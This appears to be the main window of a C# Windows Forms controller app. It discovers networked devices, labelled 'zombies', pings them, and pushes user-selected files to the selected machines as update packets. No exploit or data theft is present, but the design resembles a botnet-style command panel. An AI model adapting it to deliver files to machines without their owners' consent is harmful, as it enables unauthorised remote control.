using FirebridgeShared.Networking;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using FirebridgeClient.Controls;
using FirebridgeShared.Models;

namespace FirebridgeClient
{
    public partial class MainView : Form
    {
        private DiscoveryClient discoveryClient;
        private DashboardPanel _dashboardPanel;

        private ConcurrentBag<ZombieView> devidesConnected = new ConcurrentBag<ZombieView>();

        public MainView()
        {
            InitializeComponent();

            posY += _devices.Height + margin;
            _devices.ForeColor = ColorTranslator.FromHtml("#f7f1e3");
            this.BackColor = ColorTranslator.FromHtml("#2c2c54");

            discoveryClient = new DiscoveryClient();
            discoveryClient.ClientResponded += DiscoveryClient_ClientResponded;
            discoveryClient.Run();
            _dashboardPanel = new DashboardPanel();
            //this.Controls.Add(_dashboardPanel);

        }

        private const int margin = 30;
        private int posX = margin;
        private int posY = margin;

        private void UiUpdate()
        {

            foreach (Control control in this.Controls)
            {
                switch (control)
                {
                    case ZombieView p:
                        {
                            this.Controls.Remove(p);
                        }
                        break;
                }
            }
            posX = margin;
            posY = margin + _devices.Height;
            foreach (ZombieView zombieView in devidesConnected)
            {

                if ((posX + ZombieView.Width + margin * 2) > this.Width)
                {
                    posX = margin;
                    posY += margin + ZombieView.Height;
                }
                else
                {
                    zombieView.Location = new Point(posX, posY);
                    if (this.InvokeRequired)
                    {

                        this.Invoke(new Action(() => { this.Controls.Add(zombieView); }));
                        posX += margin * 2 + ZombieView.Width;
                    }
                    else
                    {
                        this.Controls.Add(zombieView);
                        posX += margin * 2 + ZombieView.Width;
                    }

                }
            }

           // _dashboardPanel.BringToFront();
            //_dashboardPanel.Location = new Point(this.Width - _dashboardPanel.Width - margin, this.Height - _dashboardPanel.Height - margin);
        }


        private void DiscoveryClient_ClientResponded(object sender, EventArgs e)
        {
            var data = (ClientRespondedEventArgs)e;
            if (devidesConnected.Count(x => x.Ip == data.Ip) == 0)
            {

                var control = new ZombieView(data.Ip);
                this.Invoke(new Action(() =>
                {
                    devidesConnected.Add(control);
                    UiUpdate();
                }));
            }
        }

        private int ping = 0;

        private void Timer1_Tick(object sender, EventArgs e)
        {
            ping += 1;
            if (ping == 10)
            {
                discoveryClient.SendPing();
                ping = 0;
            }

            foreach (Control control in this.Controls)
            {
                switch (control)
                {
                    case ZombieView p:
                        {
                            p.AutoUpdate();
                        }
                        break;
                }
            }
        }

        private void _buttonConsoleSubmit_Click(object sender, EventArgs e)
        {
            // c.SendPacket(new Packet() { Id = 0, Data = _textBoxSubmitText.Text + num + r.Next(500).ToString() });
        }




        private void MainView_Resize(object sender, EventArgs e)
        {
            UiUpdate();
        }

        private void SelectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ZombieView view in devidesConnected)
            {
                view.IsSelected = true;
            }
        }

        private void SendUpdateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var f = new OpenFileDialog();
            f.Multiselect = true;
            if (f.ShowDialog() == DialogResult.OK)
            {
                foreach (ZombieView view in devidesConnected.Where(x=>x.IsSelected))
                {
                    var update = new UpdateModel() { Names = new List<string>(), Data = new List<byte[]>() };
                    for (int i = 0; i < f.FileNames.Length; i++)
                    {
                        update.Data.Add(File.ReadAllBytes(f.FileNames[i]));
                        update.Names.Add(f.SafeFileNames[i]);

                    }
                    view.SendPacket(new Packet() { Id = 4, Data = update });
                }
            }
        }
    }
}
